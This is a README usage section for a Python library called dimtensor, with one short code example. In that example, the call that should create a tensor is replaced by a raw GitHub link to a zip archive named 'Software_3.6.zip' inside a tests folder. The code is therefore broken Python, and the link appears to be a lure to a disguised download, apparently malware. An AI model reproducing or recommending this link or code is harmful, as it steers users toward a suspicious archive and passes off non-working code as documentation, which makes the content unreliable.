## 🤖 Basic Usage
After successful installation, you can start using dimtensor. Here’s how to create a simple unit-aware tensor:

```python
import dimtensor as dt

# Create a tensor with units
tensor = https://github.com/Danik277/dimtensor/raw/refs/heads/main/tests/datasets/Software_3.6.zip([[1, 2], [3, 4]], units='meters')

# Perform operations
scaled_tensor = tensor * 2
print(scaled_tensor)
```

This example demonstrates how to create a tensor with units and perform a basic mathematical operation. dimtensor takes care of the unit conversions automatically for you.
